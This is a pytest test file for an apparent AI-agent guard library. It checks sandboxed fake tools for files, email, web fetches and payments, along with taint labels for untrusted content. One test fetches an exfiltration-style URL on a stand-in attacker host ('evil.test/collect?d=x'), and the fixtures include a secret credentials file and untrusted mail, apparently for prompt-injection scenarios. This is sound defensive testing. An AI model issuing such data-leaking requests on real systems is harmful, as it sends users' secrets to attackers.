"""Sandboxed fake tools and the fixture world: effects, labels and error paths."""

from __future__ import annotations

from decimal import Decimal
from pathlib import Path
from typing import Any

import pytest

from agentguard.errors import SandboxError, ScenarioError
from agentguard.labels import BOTTOM, Label
from agentguard.tooling import CallContext
from agentguard.tools import SandboxTools, World, load_world, world_from_dict

UNTRUSTED = Label.parse("untrusted")
CTX = CallContext()


@pytest.fixture
def world(root: Path) -> World:
    return load_world(root / "scenarios" / "worlds" / "office.yaml")


def call(world: World, name: str, args: dict[str, Any], ctx: CallContext = CTX) -> Any:
    return getattr(SandboxTools(world), name)(args, ctx)


def test_world_fixture_loads(world: World) -> None:
    assert world.file_label("secrets/bank-credentials.txt") == Label.parse("secret")
    assert world.file_label("downloads/setup-notes.txt") == UNTRUSTED
    assert world.file_label("notes/shared-from-web.md") == UNTRUSTED  # written label
    assert world.file_label("notes/todo.md") == BOTTOM
    assert world.file_label("does/not/exist") == BOTTOM
    assert world.balances["USD"] == Decimal(5000)
    clone = world.clone()
    clone.files.clear()
    assert world.files
    summary = world.summary()
    assert summary["balances"] == {"USD": "5000"}
    assert "notes/todo.md" in summary["files"]


def test_files(world: World) -> None:
    out = call(world, "list_files", {"path": "notes"})
    assert "notes/todo.md" in out.content
    assert out.label == UNTRUSTED  # the listing includes a tainted file
    assert call(world, "list_files", {"path": "."}).data["files"]
    with pytest.raises(SandboxError, match="no such directory"):
        call(world, "list_files", {"path": "nope"})
    assert call(world, "read_file", {"path": "notes/todo.md"}).label == BOTTOM
    with pytest.raises(SandboxError, match="no such file"):
        call(world, "read_file", {"path": "notes/none.md"})
    with pytest.raises(SandboxError, match="invalid path"):
        call(world, "read_file", {"path": "../x"})


def test_writes_keep_the_writers_label(world: World) -> None:
    tainted = CallContext(label=UNTRUSTED)
    call(world, "write_file", {"path": "notes/new.md", "content": "x"}, tainted)
    assert world.file_label("notes/new.md") == UNTRUSTED
    # overwriting from a clean context never launders the label
    call(world, "write_file", {"path": "notes/new.md", "content": "y"})
    assert call(world, "read_file", {"path": "notes/new.md"}).label == UNTRUSTED
    with pytest.raises(SandboxError, match="workspace root"):
        call(world, "write_file", {"path": ".", "content": "x"})
    with pytest.raises(SandboxError, match="larger than"):
        call(world, "write_file", {"path": "a", "content": "x" * 70_000})


def test_delete(world: World) -> None:
    assert call(world, "delete_file", {"path": "workspace/app.log"}).content.startswith("deleted")
    assert world.deleted == ["workspace/app.log"]
    with pytest.raises(SandboxError):
        call(world, "delete_file", {"path": "workspace/app.log"})


def test_mail(world: World) -> None:
    listing = call(world, "list_inbox", {})
    assert listing.label == BOTTOM
    assert "m1\tboss@example.com\tverified" in listing.content
    assert "URGENT" not in listing.content  # subjects never enter the context via listing
    assert call(world, "list_inbox", {"limit": 1}).content.count("\n") == 1
    assert call(world, "read_email", {"id": "m1"}).label == Label.parse("internal")
    assert call(world, "read_email", {"id": "m3"}).label == Label.parse("untrusted/internal")
    with pytest.raises(SandboxError, match="no message"):
        call(world, "read_email", {"id": "m99"})
    sent = call(world, "send_email", {"to": "a@example.com", "subject": "s", "body": "b"})
    assert sent.content == "sent message out1 to a@example.com"
    with pytest.raises(SandboxError, match="invalid recipient"):
        call(world, "send_email", {"to": "a@b", "subject": "s", "body": "b"})


def test_invalid_sender_is_masked() -> None:
    w = world_from_dict({"inbox": [{"from": "Mallory <m@x.test>", "body": "hi"}]})
    assert "<invalid sender>" in SandboxTools(w).list_inbox({}, CTX).content
    assert SandboxTools(World()).list_inbox({}, CTX).content == "(inbox empty)"


def test_web(world: World) -> None:
    page = call(world, "fetch_url", {"url": "https://docs.python.org/3/library/json.html"})
    assert page.label == UNTRUSTED
    with pytest.raises(SandboxError, match="404"):
        call(world, "fetch_url", {"url": "https://evil.test/collect?d=x"})
    assert world.fetched[-1] == "https://evil.test/collect?d=x"  # the attempt is recorded


def test_payments(world: World) -> None:
    assert call(world, "get_balance", {"currency": "usd"}).content == "5000 USD"
    assert "globex\tGlobex Hosting" in call(world, "list_payees", {}).content
    assert call(world, "add_payee", {"name": "New Co!", "account": "1"}).content.endswith("new-co")
    with pytest.raises(SandboxError, match="already exists"):
        call(world, "add_payee", {"name": "new co", "account": "1"})
    paid = call(world, "pay", {"payee_id": "acme", "amount": 120, "currency": "USD"})
    assert paid.content == "paid 120 USD to acme"
    assert world.balances["USD"] == Decimal(4880)
    for args, fragment in (
        ({"payee_id": "nobody", "amount": 1, "currency": "USD"}, "unknown payee"),
        ({"payee_id": "acme", "amount": 0, "currency": "USD"}, "positive"),
        ({"payee_id": "acme", "amount": 10, "currency": "EUR"}, "insufficient funds"),
    ):
        with pytest.raises(SandboxError, match=fragment):
            call(world, "pay", args)
    assert SandboxTools(World()).list_payees({}, CTX).content == "(no payees)"


def test_registry_has_every_spec(world: World) -> None:
    reg = SandboxTools(world).registry()
    assert {s.name for s in reg.specs()} >= {"pay", "send_email", "fetch_url", "delete_file"}


@pytest.mark.parametrize(
    ("data", "fragment"),
    [
        ({"files": {"../x": "y"}}, "bad fixture path"),
        ({"files": {"a": {"content": "x", "written_label": "dirty"}}}, "bad written_label"),
        ({"files": {"a": {"written_label": "untrusted"}}}, "missing 'content'"),
        ({"labels": [{"glob": "a"}]}, "missing 'label'"),
        ({"labels": [{"glob": "a", "label": "weird"}]}, "bad label"),
        ({"inbox": [{"body": "x"}]}, "missing 'from'"),
        ({"balances": {"USD": "lots"}}, "bad balance"),
        ({"payees": [{"name": "x"}]}, "missing 'id'"),
    ],
)
def test_world_fixture_errors(data: dict[str, Any], fragment: str) -> None:
    with pytest.raises(ScenarioError, match=fragment):
        world_from_dict(data)


def test_load_world_errors(tmp_path: Path) -> None:
    with pytest.raises(ScenarioError, match="cannot load world"):
        load_world(tmp_path / "missing.yaml")
    (tmp_path / "list.yaml").write_text("- 1\n")
    with pytest.raises(ScenarioError, match="not a mapping"):
        load_world(tmp_path / "list.yaml")
